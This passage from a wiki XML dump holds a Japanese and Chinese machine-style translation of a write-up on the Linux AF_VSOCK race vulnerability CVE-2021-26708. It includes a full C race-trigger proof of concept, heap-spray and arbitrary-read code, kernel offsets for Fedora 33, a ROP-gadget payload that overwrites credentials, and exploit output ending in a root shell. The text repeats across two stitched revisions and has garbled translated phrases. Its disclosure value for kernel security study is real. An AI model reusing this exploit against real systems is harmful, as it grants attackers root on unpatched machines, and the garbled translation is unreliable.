        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
しかし、msg_msgを使って内部監査データを読むにはどうすればいいのでしょうか？ msgrcv()のシステムコールファイルを読んでみると、msgrcv()とMSGフラグを使った良い解決策が見つかりました：。
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
このフラグは、メッセージデータをメッセージキューから削除することなく、カーネルがユーザースペースにコピーすることを意味します。 カーネルにCONFIG_CHECKPOINT_RESTORE=yが設定されている場合、MSGは利用可能であり、Fedora Serverでも適用可能です。

任意の読み取りのためのステップ

準備
sched_getaffinity()およびCPU_COUNT()を使用して、使用可能なCPUの数を計算します（このエクスプロイトでは、少なくとも2つのCPUが必要です）。
パージングのために/dev/kmsgを開く。
mmap()は、userfaultfd()をspray_dataメモリ領域の最後の部分として設定します。
userfaultfd()イベントを処理するために、別のpthreadを起動します。
msg_msgでsetxattr()とuserfaultfd()のヒープインジェクションを行うために127個のスレッドを立ち上げ、thread_barrierに掛けます。
オリジナルのmsg_msgのカーネルアドレスを取得します。
仮想ソケットの条件付き競争
2回目のconnect()の後、ビジー・ループで35マイクロ秒待つ。
msgsnd() を呼び出して別のメッセージキューを作成します。メモリ破壊の後、msg_msg ペアは virtio_vsock_sock の場所に置かれます。
カーネルログを解析し、カーネル警告（RCXレジスタ）からmsg_msgのカーネルアドレスを保存する。
また，RBXレジスタからvsock_sockのカーネルアドレスが格納される。
破壊された msg_msg を使って、元の msg_msg の任意の解放を行います。
メモリ破壊を実装するために、SO_VM_SOCKETS_BUFFER_SIZEとして、オリジナルのmsg_msgアドレスの4バイトを使用します。
仮想ソケットの条件付き競争
msgsnd()は2回目のconnect()の直後に呼び出され、msg_msgは破壊を実装するためにvirtio_vsock_sockの場所に置かれます。
破棄された msg_msg のセキュリティ・ポインタには、（ステップ 2 からの）元の msg_msg のアドレスが格納されます。

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
如果在處理 msgsnd() 的過程中發生了來自 setsockopt()線程的 msg_msg.security內存損壞，進而SELinux權限檢查失敗；
在這種情況下，msgsnd()返回-1，損壞的msg_msg被銷毀；釋放msg_msg.security可以釋放原始msg_msg；
用一個可控的payload 覆蓋原始msg_msg：
msgsnd()失敗後，漏洞就會調用pthread_barrier_wait()，調用127個用於堆噴射的pthreads；
這些pthreads執行setxattr()的payload；
原始msg_msg被可控的數據覆蓋，msg_msg.next指針存儲vsock_sock對象的地址；
&lt;/div&gt;

[[File:T0140baae964febb059.png | 600px ]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
通過從存儲被覆蓋的 msg_msg的消息隊列中接收消息，將vsock_sock內核對象的內容讀到用戶空間：
&lt;/div&gt;
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==尋找攻擊目標==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是我找到的點：
1.專用的塊緩存，如PINGv6和sock_inode_cache有很多指向對象的指針
2.struct mem_cgroup *sk_memcg指針在vsock_sock.sk偏移量664處。 mem_cgroup結構是在kmalloc-4k塊緩存中分配的。
3.const struct cred *owner指針在vsock_sock.sk偏移量840處，存儲了可以覆蓋進行權限升級的憑證的地址。
4.void (*sk_write_space)(struct sock *)函數指針在vsock_sock.sk偏移量688處，被設置為sock_def_write_space()內核函數的地址。它可以用來計算KASLR偏移量。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面是該漏洞如何從內存中提取這些指針:
&lt;/div&gt;

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==在 sk_buff 上實現 Use-after-free==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
Linux內核中與網絡相關的緩衝區用struct sk_buff表示，這個對像中有skb_shared_info與destructor_arg，可以用於控制流劫持。網絡數據和skb_shared_info被放置在由sk_buff.head指向的同一個內核內存塊中。因此，在用戶空間中創建一個2800字節的網絡數據包會使skb_shared_info被分配到kmalloc-4k塊緩存中，mem_cgroup對像也是如此。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
我構建了以下步驟：
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
1.使用socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)創建一個客戶端套接字和32個服務器套接字
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
2.在用戶空間中準備一個2800字節的緩衝區，並用0x42對其memset()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
3.用sendto()將這個緩衝區從客戶端套接字發送到每個服務器套接字，用於在kmalloc-4k中創建sk_buff對象。在每個可用的CPU上使用`sched_setaffinity()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
4.對vsock_sock執行任意讀取過程
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
5.計算可能的sk_buff內核地址為sk_memcg加4096(kmalloc-4k的下一個元素)
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
6.對這個可能的sk_buff地址執行任意讀
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
7.如果在網絡數據的位置找到0x42424242424242lu，則找到真正的sk_buff，進入步驟8。否則，在可能的sk_buff地址上加4096，轉到步驟6
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
8.sk_buff上執行32個pthreads的setxattr()&amp;userfaultfd()堆噴射，並把它們掛在pthread_barrier上
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
9.對sk_buff內核地址進行任意釋放
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
10.調用pthread_barrier_wait()，執行32個setxattr()覆蓋skb_shared_info的堆噴pthreads
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
11.使用recv()接收服務器套接字的網絡消息。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==通過skb_shared_info 進行任意寫==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是覆蓋sk_buff對象的有效payload：
&lt;/div&gt;

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
skb_shared_info駐留在噴射數據中，正好在偏移量SKB_SHINFO_OFFSET處，即3776字節。 skb_shared_info.destructor_arg指針存儲了struct ubuf_info的地址。因為被攻擊的sk_buff的內核地址是已知的，所以能在網絡緩衝區的MY_UINFO_OFFSET處創建了一個假的ubuf_info。下面是有效payload的佈局：
&lt;/div&gt;

[[File:T0185ccbf9f025c74da.png  | 600px]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面講講destructor_arg 回調:
&lt;/div&gt;
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
由於在vmlinuz-5.10.11-200.fc33.x86_64中找不到一個能滿足我需求的gadget，所以我自己進行了研究構造。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
callback函數指針存儲一個ROP gadget 地址，RDI存儲callback函數的第一個參數，也就是ubuf_info本身的地址，RDI + 8指向ubuf_info.desc。 gadget 將ubuf_info.desc移動到RDX。現在RDX包含有效用戶ID和組ID的地址減一個字節。這個字節很重要：當gadget從 RSI向 RDX指向的內存中寫入消息1時，有效的 uid和 gid將被零覆蓋。重複同樣的過程，直到權限升級到root。整個過程輸出流如下：
&lt;/div&gt;
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==視頻==
&lt;/div&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>a09jwb2t4t0amox45iy8j67wqk4z781</sha1>
    </revision>
    <revision>
      <id>2295</id>
      <parentid>2261</parentid>
      <timestamp>2021-05-05T05:42:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "しかし、msg_msgを使って内部監査データを読むにはどうすればいいのでしょうか？ msgrcv()のシステムコールファイルを読んでみると..."</comment>
      <origin>2295</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="29104" sha1="ninxqojjukn8ljx8qjqv6zhl2dz0qhf" xml:space="preserve">&lt;languages  /&gt;
==脆弱性==

これらの脆弱性は、&lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;の誤ロックによる条件闘争が原因です。 これらの条件闘争は、VSOCKマルチトランスファーのサポートを追加した2019年11月のコミットで暗黙のうちに導入され、Linuxカーネルバージョン5.5-rc1にマージされました。

&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt;と&lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt;は、すべての主要なGNU/Linuxディストリビューションのカーネルモジュールとして提供されています。 これらの脆弱なモジュールは、AF_VSOCKドメインのソケットを作成した際に自動的にロードされます。
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

&lt;code&gt;AF_VSOCK&lt;/code&gt;のソケット作成は、非特権ユーザが利用でき、ユーザ名空間を必要としません。


メモリの破損

以下は、CVE-2021-26708の悪用についての詳細です。この悪用は、&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;の条件付き競争を利用しており、回復には2つのスレッドが必要で、最初のスレッドが&lt;code&gt;setsockopt()&lt;/code&gt;を呼び出します。
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



2番目のスレッドは、&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;がソケットロックを取得しようとしたときに、仮想ソケットのトランスポートを変更しますが、これは仮想ソケットを再接続することで実現します。
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


仮想ソケットの&lt;code&gt;connect()&lt;/code&gt;を処理するために、カーネルは&lt;code&gt;vsock_assign_transport()&lt;/code&gt;を呼び出した&lt;code&gt;vsock_stream_connect()&lt;/code&gt;を実行します。 この関数には以下のコードが含まれています。
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;code&gt;vsock_stream_connect()&lt;/code&gt;にはソケットロックがあり、並列スレッドの&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;もソケットロックを取得しようとするため、条件付きの競合となります。 その結果、異なる&lt;code&gt;svm_cid&lt;/code&gt;で2回目の&lt;code&gt;connect()&lt;/code&gt;を実行した際に、&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;関数が呼び出されます。 この関数は、&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;を実行し、&lt;code&gt;vsock_sock.trans&lt;/code&gt;を解放し、&lt;code&gt;vsk-&gt;transport&lt;/code&gt;をNULLに設定する。 stream_connect()&lt;/code&gt;がソケットのロックを解除することで、&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;の実行を継続することができます。 &lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;を呼び出し、続いて&lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;を呼び出します。 ここでtransportは、&lt;code&gt;vsk-&gt;transport&lt;/code&gt;に一致しないローカル変数からの廃止された値を含んでいます（原因はNULLに設定されています）。

カーネルが&lt;code&gt;virtio_transport_notify_buffer_size()&lt;/code&gt;を実行すると、メモリが破壊されます。
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

ここで，vvsはカーネルメモリへのポインタであり，&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;で解放されている。&lt;code&gt;struct virtio_vsock_sock&lt;/code&gt; は 64 バイトのサイズで、kmalloc-64 ブロックキャッシュに配置されています。&lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE is 0xFFFFFFFFUL&lt;/code&gt; &lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE is 0xFFFFFFFFUL&lt;/code&gt; buf_alloc フィールドタイプは u32 で、オフセット 40 にある。valの値は攻撃者が制御し、その最下位4バイトが解放されたメモリに書き込まれます。


ファジーテスト

syzkaller fuzzerにはこのクラッシュを再現する方法がないので、自分で調べてみることにしました。 しかし、なぜfuzzerは失敗するのか？ &lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;を見てみると、次のようなことがわかりました。
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

&lt;code&gt;notify_buffer_size()&lt;/code&gt;はvalが現在のbuffer_sizeと異なる場合にのみ呼び出され、&lt;code&gt;setsockopt()&lt;/code&gt;は&lt;code&gt;SO_VM_SOCKETS_BUFFER_SIZE&lt;/code&gt;を実行します。 code&gt;の場合、sizeパラメータは呼び出されるたびに異なるはずです。 そこで、コードを作ってみました。
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

ここでのサイズの値は、&lt;code&gt;clock_gettime()&lt;/code&gt;が返すナノ秒の数から取得されるため、毎回異なる値になる可能性があります。 オリジナルの syzkaller では、syscall パラメータの値は syzkaller がファジング入力を生成する際に決定され、実行時には変更されないため、この処理は行われません。

四字熟語の威力

ここでは、研究対象としてFedora 33 Serverを選び、カーネルバージョン5.10.11-200.fc33.x86_64で、SMEPとSMAPを回避することにしました。

その第一歩として、私は安定したヒープイジェクションに取り組み始めました。これは、ユーザースペースを実行する活動を利用して、カーネルが解放されたvirtio_vsock_sockの場所に別の64バイトのオブジェクトを割り当てるようにするものです。 数回の実験の後、リリースされた virtio_vsock_sock が上書きされていることが確認され、ヒープインジェクションが実行可能であることがわかりました。 最終的に msgsnd() システムコールを見つけました。これはカーネル空間で msg_msg 構造体を作成します。
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

表はメッセージのヘッダー、裏はメッセージのデータです。 ユーザ空間の struct msgbuf に 16 バイトの mtext がある場合、対応する msg_msg が kmalloc-64 ブロック・キャッシュに作成されます。 4 バイトの write-after-free により、オフセット 40 の void *security ポインタが破壊されます。msg_msg.securityフィールドは、msg_msgを受信したときに、lsm_msg_alloc()によって割り当てられ、security_msg_msg_free()によって解放されたカーネルデータを指します。 このように、セキュリティ・ポインターの前半部分を壊すことで、任意の自由を得ることができます。

社内コア情報の漏洩

Used here [https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6% BC%8F%E6%B4%9E CVE-2019-18683]で同じ仕掛けをしています。 バーチャルソケットの2回目のconnect()では、&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;を呼び出し、&lt;code&gt;vsk-&gt;transport&lt;/code&gt;をNULLに設定することで、&lt;code&gt;vsock_stream_setsockopt()&lt;? /code&gt;call &lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt;の後に、カーネルアラームでメモリクラッシュが発生したことがあります。
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
gdbによるデバッグで、RCXレジスタには解放されたvirtio_vsock_sockのカーネルアドレスが、RBXレジスタにはvsock_sockのカーネルアドレスが入っていることがわかりました。

どこでも読める

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
===從 arbitrary free 到 use-after-free===
&lt;/div&gt;

リークされたカーネルアドレスからのオブジェクトの解放
ヒープスプレーを行い、制御されたデータでオブジェクトを上書きする
破損したオブジェクトを特権昇格に利用する
System V メッセージのカーネルの実装では、DATALEN_MSG の最大値は、PAGE_SIZE から sizeof(struct msg_msg)を引いた値に制限されています。) より大きなメッセージを送信した場合、残りのメッセージはメッセージセグメントのリストに保存されます。msg_msgは、最初のセグメントを指すstruct msg_msgseg *nextと、サイズを格納する size_t m_tsを含んでいます。 上書き操作を行うと、制御された値が msg_msg.m_ts と msg_msg.next に配置されます。

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
